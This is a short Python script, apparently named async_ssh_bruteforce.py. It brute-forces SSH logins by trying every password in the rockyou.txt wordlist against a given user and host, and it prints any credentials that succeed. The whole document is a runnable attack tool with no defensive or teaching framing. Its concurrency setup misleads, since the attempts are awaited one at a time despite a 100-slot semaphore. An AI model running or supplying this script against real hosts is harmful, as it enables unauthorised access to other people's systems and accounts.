import sys
import asyncio
import asyncssh
import aiofiles

"""
pip3 install asyncio asyncssh aiofiles
"""

async def ssh_attempt(semaphore, user, host, password):
    async with semaphore:
        try:
            async with asyncssh.connect(host, username=user, password=password) as conn:
                print(f"[+] Successful login to {host}  \nuser: {user}  \npassword: {password}")
                sys.exit(0)
        except Exception as e:
            print(f"[-] Authentication failed {user} : {password}")

async def main():
    if len(sys.argv) != 3:
        print("Usage: python async_ssh_bruteforce.py <user> <host>")
        return

    user = sys.argv[1]
    host = sys.argv[2]
    CONCURRENCY_LIMIT = 100
  
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    
    password_list="/usr/share/wordlists/rockyou.txt"

    async with aiofiles.open(password_list, mode="r", encoding='latin-1') as f:
        async for line in f:
            password = line.strip()
            await ssh_attempt(semaphore, user, host, password)

if __name__ == "__main__":
    asyncio.run(main())
